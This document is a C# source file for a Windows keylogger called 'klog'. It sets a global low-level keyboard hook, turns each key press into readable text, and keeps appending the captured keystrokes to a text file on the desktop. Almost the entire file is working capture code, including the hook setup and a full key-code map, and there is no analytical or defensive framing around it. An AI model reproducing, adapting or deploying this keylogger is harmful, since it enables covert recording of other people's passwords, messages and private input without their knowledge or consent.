using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;
using Windows.Win32.Foundation;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
    private static readonly List<string> Buffer = new();
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static StreamWriter _writer = new(PathToFile);
    private const uint BufferSize = 10;

    public static unsafe void Main()
    {
        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
        
        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
        
        // clean disposable things up
        _kbHook.Close();
        _writer.Flush();
        _writer.Dispose();
    }

    private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
        
        // checking for events other than keydown
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
        // their code
        var stringToWrite = kbStruct->vkCode switch
        {
            0x08 => " [BACKSPACE] ",
            0x09 => " [TAB] ",
            0x0C => " [CLEAR] ",
            0x0D => " [ENTER] ",
            0x10 => " [SHIFT] ",
            0x11 => " [CTRL] ",
            0x12 => " [ALT] ",
            0x13 => " [PAUSE] ",
            0x14 => " [CAPS LOCK] ",
            0x15 => " [IME Kana/Hangul mode] ",
            0x17 => " [IME On] ",
            0x18 => " [IME final mode] ",
            0x19 => " [IME Hanja/Kanji mode] ",
            0x1A => " [IME Off] ",
            0x1B => " [ESCAPE] ",
            0x1C => " [IME convert] ",
            0x1D => " [IME nonconvert] ",
            0x1E => " [IME accept] ",
            0x1F => " [IME mode change request] ",
            0x20 => " [SPACE] ",
            0x21 => " [PAGE UP] ",
            0x22 => " [PAGE DOWN] ",
            0x23 => " [END] ",
            0x24 => " [HOME] ",
            0x25 => " [LEFT ARROW] ",
            0x26 => " [UP ARROW] ",
            0x27 => " [RIGHT ARROW] ",
            0x28 => " [DOWN ARROW] ",
            0x29 => " [SELECT] ",
            0x2A => " [PRINT] ",
            0x2B => " [EXECUTE] ",
            0x2C => " [PRINT SCREEN] ",
            0x2D => " [INSERT] ",
            0x2E => " [DELETE] ",
            0x2F => " [HELP] ",
            0x30 => "0",
            0x31 => "1",
            0x32 => "2",
            0x33 => "3",
            0x34 => "4",
            0x35 => "5",
            0x36 => "6",
            0x37 => "7",
            0x38 => "8",
            0x39 => "9",
            0x41 => "A",
            0x42 => "B",
            0x43 => "C",
            0x44 => "D",
            0x45 => "E",
            0x46 => "F",
            0x47 => "G",
            0x48 => "H",
            0x49 => "I",
            0x4A => "J",
            0x4B => "K",
            0x4C => "L",
            0x4D => "M",
            0x4E => "N",
            0x4F => "O",
            0x50 => "P",
            0x51 => "Q",
            0x52 => "R",
            0x53 => "S",
            0x54 => "T",
            0x55 => "U",
            0x56 => "V",
            0x57 => "W",
            0x58 => "X",
            0x59 => "Y",
            0x5A => "Z",
            0x5B => " [LEFT WINDOWS KEY] ",
            0x5C => " [RIGHT WINDOWS KEY] ",
            0x5D => " [APPLICATIONS KEY] ",
            0x5F => " [SLEEP] ",
            0x60 => "[NUMPAD 0]",
            0x61 => "[NUMPAD 1]",
            0x62 => "[NUMPAD 2]",
            0x63 => "[NUMPAD 3]",
            0x64 => "[NUMPAD 4]",
            0x65 => "[NUMPAD 5]",
            0x66 => "[NUMPAD 6]",
            0x67 => "[NUMPAD 7]",
            0x68 => "[NUMPAD 8]",
            0x69 => "[NUMPAD 9]",
            0x6A => " [MULTIPLY] ",
            0x6B => " [ADD] ",
            0x6C => " [SEPARATOR] ",
            0x6D => " [SUBTRACT] ",
            0x6E => " [DECIMAL] ",
            0x6F => " [DIVIDE] ",
            0x70 => " [F1] ",
            0x71 => " [F2] ",
            0x72 => " [F3] ",
            0x73 => " [F4] ",
            0x74 => " [F5] ",
            0x75 => " [F6] ",
            0x76 => " [F7] ",
            0x77 => " [F8] ",
            0x78 => " [F9] ",
            0x79 => " [F10] ",
            0x7A => " [F11] ",
            0x7B => " [F12] ",
            0x7C => " [F13] ",
            0x7D => " [F14] ",
            0x7E => " [F15] ",
            0x7F => " [F16] ",
            0x80 => " [F17] ",
            0x81 => " [F18] ",
            0x82 => " [F19] ",
            0x83 => " [F20] ",
            0x84 => " [F21] ",
            0x85 => " [F22] ",
            0x86 => " [F23] ",
            0x87 => " [F24] ",
            0x90 => " [NUM LOCK] ",
            0x91 => " [SCROLL LOCK] ",
            0xA0 => " [LEFT SHIFT] ",
            0xA1 => " [RIGHT SHIFT] ",
            0xA2 => " [LEFT CONTROL] ",
            0xA3 => " [RIGHT CONTROL] ",
            0xA4 => " [LEFT ALT] ",
            0xA5 => " [RIGHT ALT] ",
            0xA6 => " [BROWSER BACK] ",
            0xA7 => " [BROWSER FORWARD] ",
            0xA8 => " [BROWSER REFRESH] ",
            0xA9 => " [BROWSER STOP] ",
            0xAA => " [BROWSER SEARCH] ",
            0xAB => " [BROWSER FAVOURITES] ",
            0xAC => " [BROWSER START/HOME] ",
            0xAD => " [VOLUME MUTE] ",
            0xAE => " [VOLUME DOWN] ",
            0xAF => " [VOLUME UP] ",
            0xB0 => " [NEXT TRACK] ",
            0xB1 => " [PREVIOUS TRACK] ",
            0xB2 => " [STOP MEDIA] ",
            0xB3 => " [PLAY/PAUSE MEDIA] ",
            0xB4 => " [START MAIL] ",
            0xB5 => " [SELECT MEDIA] ",
            0xB6 => " [START APPLICATION 1] ",
            0xB7 => " [START APPLICATION 2] ",
            _ => $"[CODE {kbStruct->vkCode.ToString()}]"
        };

        WriteToFile(stringToWrite);
        
        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    /// <summary>
    /// Adds a string to the <see cref="Buffer"/> and writes the <see cref="Buffer"/> to file if
    /// <see cref="BufferSize"/> has been reached.
    /// </summary>
    /// <param name="stringToWrite">String to add to buffer</param>
    private static async void WriteToFile(string stringToWrite)
    {
        if (Buffer.Count >= BufferSize)
        {
            try
            {
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (ObjectDisposedException)
            {
                _writer = new StreamWriter(PathToFile);
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (InvalidOperationException)
            {
                Thread.Sleep(1000);
                await WriteBuffer();
                await _writer.FlushAsync();
            }
        }
        Buffer.Add(stringToWrite);
    }

    /// <summary>
    /// Writes buffer to file using the <see cref="_writer">_writer object</see>
    /// </summary>
    private static async Task WriteBuffer()
    {
        foreach (var str in Buffer)
        {
            await _writer.WriteAsync(str);
        }
        Buffer.Clear();
    }
}